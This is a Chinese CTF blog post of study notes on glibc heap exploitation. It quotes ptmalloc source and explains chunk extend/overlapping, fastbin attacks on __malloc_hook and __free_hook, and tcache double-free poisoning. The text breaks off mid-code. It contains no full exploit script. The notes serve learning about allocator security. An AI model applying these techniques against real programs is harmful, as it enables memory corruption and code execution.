<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Ev3r"><meta name="copyright" content="Ev3r"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>堆知识--持续 | Ev3r's blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"example.com","root":"/","title":"Ev3r","version":"1.5.2","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"想要搜什么，来这里","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=UA-121354150-1"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-121354150-1');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="堆源码的知识总是看一点忘一点，导致堆的学习非常缓慢。这里我还是开个文章记录一下，堆源码的知识吧。 Chunk Extend and Overlapping这是一种通过改变chunk head来达到伪造chunk大小，从而把用户区申请到相邻的chunk上去，达到溢出修改其他chunk的目的。 主要利用的ptmalloc机制如下。  寻找下一个chunk的机制（下一个指高地址）  ptmalloc机">
<meta property="og:type" content="article">
<meta property="og:title" content="堆知识--持续">
<meta property="og:url" content="http://example.com/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/index.html">
<meta property="og:site_name" content="Ev3r&#39;s blog">
<meta property="og:description" content="堆源码的知识总是看一点忘一点，导致堆的学习非常缓慢。这里我还是开个文章记录一下，堆源码的知识吧。 Chunk Extend and Overlapping这是一种通过改变chunk head来达到伪造chunk大小，从而把用户区申请到相邻的chunk上去，达到溢出修改其他chunk的目的。 主要利用的ptmalloc机制如下。  寻找下一个chunk的机制（下一个指高地址）  ptmalloc机">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.bmp.ovh/imgs/2021/05/6614988d4c0429fe.png">
<meta property="og:image" content="https://i.loli.net/2021/04/25/TJmHMPc46jQSXx8.png">
<meta property="article:published_time" content="2021-05-13T03:13:20.000Z">
<meta property="article:modified_time" content="2021-05-31T12:52:31.746Z">
<meta property="article:author" content="Ev3r">
<meta property="article:tag" content="Linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.bmp.ovh/imgs/2021/05/6614988d4c0429fe.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="Ev3r"><img width="96" loading="lazy" src="/images/head.jpg" alt="Ev3r"><span class="site-author-status" title="nothing for pwn">🙂</span></a><div class="site-author-name"><a href="/about/">Ev3r</a></div><span class="site-name">Ev3r's blog</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="我的主页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">69</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">35</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/myenid?tab=repositories" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://ctf-wiki.org/pwn/readme/" title="Wiki" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/504533786" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" target="_blank" rel="noopener" href="https://mlysoft.cn/cross.html" title="js师傅" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chunk-Extend-and-Overlapping"><span class="toc-number">1.</span> <span class="toc-text">Chunk Extend and Overlapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">2.</span> <span class="toc-text">fastbin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">3.</span> <span class="toc-text">tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin"><span class="toc-number">4.</span> <span class="toc-text">unsorted bin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">4.1.</span> <span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">特殊利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">tcache 管理器的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#glibc-2-32%E4%B8%8B%E7%9A%84-tcache-put-%E4%B8%8E-tcache-get"><span class="toc-number">5.0.1.</span> <span class="toc-text">glibc 2.32下的 tcache_put 与 tcache_get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-heap-base"><span class="toc-number">5.0.2.</span> <span class="toc-text">leak heap_base</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache%E4%BB%8E0%E5%88%B01"><span class="toc-number">5.1.</span> <span class="toc-text">tcache从0到1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smallbin%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">5.1.1.</span> <span class="toc-text">smallbin的利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E4%B8%8A%E7%9A%84orw"><span class="toc-number">6.</span> <span class="toc-text">堆上的orw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc-gt-2-29"><span class="toc-number">6.1.</span> <span class="toc-text">glibc&gt;2.29</span></a></li></ol></li></ol></div></div></div><div class="tag-cloud"><div class="tag-cloud-tags"><a href="/tags/BJDCTF-2nd%E5%A4%8D%E7%8E%B0/" style="font-size: 21px; color: #4d89c0">BJDCTF 2nd复现</a> <a href="/tags/IO-FILE/" style="font-size: 12px; color: #999">IO_FILE</a> <a href="/tags/Linux/" style="font-size: 21px; color: #4d89c0">Linux</a> <a href="/tags/Nep2021/" style="font-size: 12px; color: #999">Nep2021</a> <a href="/tags/SROP/" style="font-size: 25.5px; color: #2680d4">SROP</a> <a href="/tags/UAF/" style="font-size: 30px; color: #0078e7">UAF</a> <a href="/tags/VNCTF2021/" style="font-size: 12px; color: #999">VNCTF2021</a> <a href="/tags/ciscn2021/" style="font-size: 12px; color: #999">ciscn2021</a> <a href="/tags/debug/" style="font-size: 12px; color: #999">debug</a> <a href="/tags/double-free/" style="font-size: 12px; color: #999">double_free</a> <a href="/tags/fastbin/" style="font-size: 12px; color: #999">fastbin</a> <a href="/tags/fastbin-attack/" style="font-size: 12px; color: #999">fastbin-attack</a> <a href="/tags/libc%E6%B3%84%E9%9C%B2/" style="font-size: 16.5px; color: #7391ad">libc泄露</a> <a href="/tags/off-by-one%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/" style="font-size: 12px; color: #999">off_by_one原理和利用</a> <a href="/tags/orw%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" style="font-size: 12px; color: #999">orw系统调用</a> <a href="/tags/overflow/" style="font-size: 12px; color: #999">overflow</a> <a href="/tags/overlapping/" style="font-size: 12px; color: #999">overlapping</a> <a href="/tags/reverse/" style="font-size: 12px; color: #999">reverse</a> <a href="/tags/shell/" style="font-size: 12px; color: #999">shell</a> <a href="/tags/shellcode/" style="font-size: 25.5px; color: #2680d4">shellcode</a></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://example.com/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Ev3r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Ev3r's blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">堆知识--持续<a class="post-edit-link" href="https://github.com/myenid/myenid.github.io_posts/堆知识-持续.md" target="_blank" title="编辑" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-05-13 11:13:20" itemprop="dateCreated datePublished" datetime="2021-05-13T11:13:20+08:00">2021-05-13</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="修改时间：2021-05-31 20:52:31" itemprop="dateModified" datetime="2021-05-31T20:52:31+08:00">2021-05-31</time></div><span class="leancloud_visitors" id="/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/" data-flag-title="堆知识--持续"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="评论数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-chat-3-line"></use></svg> <span class="waline-comment-count" id="/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/%E5%9F%BA%E7%A1%80/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">基础</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/Linux/" style="--text-color:#2577b1"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Linux</span></a></span></div><div class="post-author"><span class="author-name">Ev3r</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p> 堆源码的知识总是看一点忘一点，导致堆的学习非常缓慢。这里我还是开个文章记录一下，堆源码的知识吧。</p>
<h2 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h2><p>这是一种通过改变chunk head来达到伪造chunk大小，从而把用户区申请到相邻的chunk上去，达到溢出修改其他chunk的目的。</p>
<p>主要利用的ptmalloc机制如下。</p>
<ul>
<li>寻找下一个chunk的机制（下一个指高地址）</li>
</ul>
<p>ptmalloc机制通过当前chunk指针加上当前chunk大小来获取下一个chunk的指针。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Ptr to next physical malloc_chunk. */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">next_chunk</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>而获取chunk大小则是如下</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Get size, ignoring use bits */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">chunksize</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>SIZE_BITS<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">chunksize_nomask</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">-></span>mchunk_size<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p>
<p>所以只要我们改掉size位就可以伪造当前chunk的size，从而对下一个chunk非法申请。</p>
<p>在 ptmalloc 中，获取前一个 chunk 信息的操作如下 </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">prev_size</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">-></span>mchunk_prev_size<span class="token punctuation">)</span></span></span>

<span class="token comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">prev_chunk</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">prev_size</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p>
<p>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下： </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">inuse</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span>mchunk_size<span class="token punctuation">)</span> <span class="token operator">&amp;</span> PREV_INUSE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> 即查看下一 <code>chunk</code> 的 <code>prev_inuse</code> 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
<p>也就是说，伪造<code>size</code> 然后把<code>chunk</code> <code>free</code>之后，计算出来的下一个chunk，实际上就是更具伪造的<code>size</code>计算出来的。</p>
<p>利用如上几点可以进行extend 和 overlapping</p>
<p><strong>总的来说，可以修改fd造成fastbin attack 也可以unsorted bin泄露</strong>主要是overlapping之后，原指针也可以操作chunk。</p>
<p>有溢出就可以用这个overlap，修改chunk指针，导致两个指针指向一个chunk</p>
<h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>利用点在于<code>fastbin</code>的管理机制，</p>
<p>首先，fastbin的pre_inuse位永远是1，这保证了fastbin不会发生合并</p>
<p>而且，fastbin free后是靠fd指针链接在一起的，所以先进去的在前面，也就是链表尾，那么遍历fasbin的时候，就是从最后一个进去的chunk开始遍历的，</p>
<p>所以fastbin 先进后出。</p>
<p><strong>此外</strong>，_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p>
<p>_int_malloc 中的校验如下 </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      errstr <span class="token operator">=</span> <span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">;</span>
    errout<span class="token operator">:</span>
      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>index</strong>，看fastbin的结构</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span>
<span class="token comment">//这里的size不包括chunk头</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>idx实际上是<code>main_arena</code>找相应的fasbin的一种方法吧，在进行fd修改的时候，要伪造size，而这里就可以看下怎么让大小在fastbin内</p>
<p>程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">##define <span class="token function">fastbin_index</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                      \
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span>SIZE_SZ <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>所以说，实际上0x7f是在idx=5的chunk，0x7f&gt;&gt;4 = 7 7-2 = 5</p>
<p>将fastbin分配到<code>__malloc_hook</code>或者<code>__free_hook</code>的时候，要注意这个，要去看hook附近有没有可以错位的大小。</p>
<p>最后fastbin attack其实目的就在于<strong>获得</strong>fd的控制权限。也就是chunk的任意分配。</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>tcache 也可以double free 而且在早期的libc2.27以前，可以说是横行霸道，应为可以直接多次free没有任何的保护机制。后来libc经过升级之后，增加了一些保护机制。</p>
<p>malloc.c-&gt;2904行</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
  <span class="token comment">/* This field exists to detect double frees.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">tcache_perthread_struct</span> <span class="token operator">*</span>key<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> tcache_entry<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如源码，tcache结构体添加了一个key字段来防止double frees。</p>
<p>malloc.c-&gt;4189行</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins<span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
	<span class="token comment">/* Check to see if it's already in the tcache.  */</span>
	tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^&lt;size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> tcache<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果要free的块的key与tcache相等</span>
	  <span class="token punctuation">&#123;</span>
	    tcache_entry <span class="token operator">*</span>tmp<span class="token punctuation">;</span>
	    <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_tcache_double_free<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
